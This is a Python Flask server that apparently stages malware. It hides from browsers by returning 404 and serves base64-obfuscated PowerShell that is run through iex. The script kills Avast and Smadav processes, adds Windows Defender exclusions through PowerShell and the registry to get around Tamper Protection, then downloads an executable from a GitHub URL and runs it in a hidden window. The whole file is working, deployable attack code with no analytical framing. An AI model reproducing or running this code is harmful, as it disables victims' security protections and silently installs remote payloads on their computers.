from flask import Flask, Response, request
import base64
import os

app = Flask(__name__)

@app.route('/')
def direct_command():
    user_agent = request.headers.get('User-Agent', '').lower()
    
    # Stealth: 404 for browsers
    if 'mozilla' in user_agent and 'powershell' not in user_agent:
        return Response("Not Found", status=404)

    raw_script = """
$currentPrincipal = New-Object Security.Principal.WindowsPrincipal([Security.Principal.WindowsIdentity]::GetCurrent())
if ($currentPrincipal.IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)) {
    Write-Host "--- JAILBREAK-1: ACTIVE ---" -ForegroundColor Green
    
    # 1. Kill background guards
    $procs = @("AvastUI", "AvastSvc", "Smadav", "SMADAV", "client_10")
    foreach ($p in $procs) { taskkill /F /IM "$p.exe" /T 2>$null }

    # 2. Advanced Exclusion Method
    $path = "$HOME\\client_10.exe"
    Write-Host "[+] Bypassing security layers..." -ForegroundColor Cyan
    
    # Method A: Standard PowerShell Exclusion
    Add-MpPreference -ExclusionPath $path -ErrorAction SilentlyContinue
    Add-MpPreference -ExclusionPath $HOME -ErrorAction SilentlyContinue
    
    # Method B: Force via Registry (Often bypasses Tamper Protection UI blocks)
    try {
        $regPath = "HKLM:\\SOFTWARE\\Microsoft\\Windows Defender\\Exclusions\\Paths"
        if (Test-Path $regPath) {
            New-ItemProperty -Path $regPath -Name $path -Value 0 -PropertyType DWord -Force -ErrorAction SilentlyContinue
        }
    } catch {}

    # 3. Deployment with Retry Logic
    Start-Job -ScriptBlock {
        param($p)
        $url = "https://github.com/jembex/Top-Followers/raw/refs/heads/main/client_10.exe"
        for ($i=0; $i -lt 3; $i++) {
            try {
                if (!(Test-Path $p)) {
                    (New-Object System.Net.WebClient).DownloadFile($url, $p)
                }
                if (Test-Path $p) { 
                    Start-Process $p -WindowStyle Hidden
                    break 
                }
            } catch { Start-Sleep -Seconds 5 }
        }
    } -ArgumentList $path
    
    Write-Host "[+] Background deployment finalized." -ForegroundColor Green
}
"""
    encoded_bytes = base64.b64encode(raw_script.encode('utf-8'))
    scrambled_logic = encoded_bytes.decode('utf-8')
    ps_payload = f"$data = [System.Convert]::FromBase64String('{scrambled_logic}'); $code = [System.Text.Encoding]::UTF8.GetString($data); iex $code"

    return Response(ps_payload, mimetype='text/plain')

if __name__ == "__main__":
    port = int(os.environ.get("PORT", 10000))
    app.run(host='0.0.0.0', port=port)
